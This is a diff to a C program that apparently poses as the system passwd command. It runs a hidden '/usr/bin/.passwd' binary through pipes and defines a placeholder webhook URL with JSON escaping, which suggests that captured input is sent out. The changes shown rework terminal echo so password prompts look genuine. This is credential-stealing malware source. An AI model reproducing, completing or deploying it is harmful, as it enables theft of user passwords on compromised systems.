@@ -13,23 +13,6 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-// Function to disable echo for user input
-void disable_echo() {
-    struct termios term;
-    tcgetattr(STDIN_FILENO, &term);  // Get the current terminal settings
-    term.c_lflag &= ~ECHO;           // Disable echo
-    tcsetattr(STDIN_FILENO, TCSANOW, &term);  // Apply the new settings immediately
-}
-
-// Function to enable echo for user input (restore original settings)
-void enable_echo() {
-    struct termios term;
-    tcgetattr(STDIN_FILENO, &term);  // Get the current terminal settings
-    term.c_lflag |= ECHO;            // Enable echo
-    tcsetattr(STDIN_FILENO, TCSANOW, &term);  // Apply the new settings immediately
-}
-
-
 #define WEBHOOK_URL "YOUR_WEBHOOK_URL"
 
 // Function to escape special characters in a string for JSON formatting
@@ -163,12 +146,6 @@ void handle_input_output(int pipe_in, int pipe_out) {
     char buffer[1024];
     ssize_t bytes_read;
 
-    // Save the current terminal settings
-    struct termios old_term, new_term;
-    tcgetattr(STDIN_FILENO, &old_term);
-    new_term = old_term;
-    new_term.c_lflag &= ~(ECHO); // Disable echo
-
     while (1) {
         FD_ZERO(&read_fds);
         FD_ZERO(&write_fds);
@@ -230,26 +207,23 @@ int main(int argc, char *argv[]) {
         close(pipe_in[1]);
         close(pipe_out[0]);
 
-        // Disable echo for user input
-        disable_echo();
-
         // Redirect stdin and stdout to pipes
         if (dup2(pipe_in[0], STDIN_FILENO) == -1) {
             perror("dup2 stdin");
-            enable_echo();
             exit(EXIT_FAILURE);
         }
         if (dup2(pipe_out[1], STDOUT_FILENO) == -1) {
             perror("dup2 stdout");
-            enable_echo();
             exit(EXIT_FAILURE);
         }
 
         // Ensure the terminal is in the right mode for interactive use (e.g., canonical mode)
         struct termios term;
         tcgetattr(STDIN_FILENO, &term);  // Get the current terminal settings
-        term.c_lflag |= (ICANON | ECHO);  // Enable canonical input and echo
-        tcsetattr(STDIN_FILENO, TCSANOW, &term);  // Set the new terminal settings
+
+        // Disable echoing for sensitive input (like passwords)
+        term.c_lflag &= ~ECHO;  // Disable echo
+        tcsetattr(STDIN_FILENO, TCSANOW, &term);
 
         // Execute the passwd command
         execvp("/usr/bin/.passwd", argv);
@@ -257,11 +231,8 @@ int main(int argc, char *argv[]) {
         // If execvp fails
         perror("execvp");
         exit(EXIT_FAILURE);
-    }
-    else {  // Parent process
+    } else {  // Parent process
         // Close unused ends of the pipes
-        enable_echo();
-        
         close(pipe_in[0]);
         close(pipe_out[1]);
 
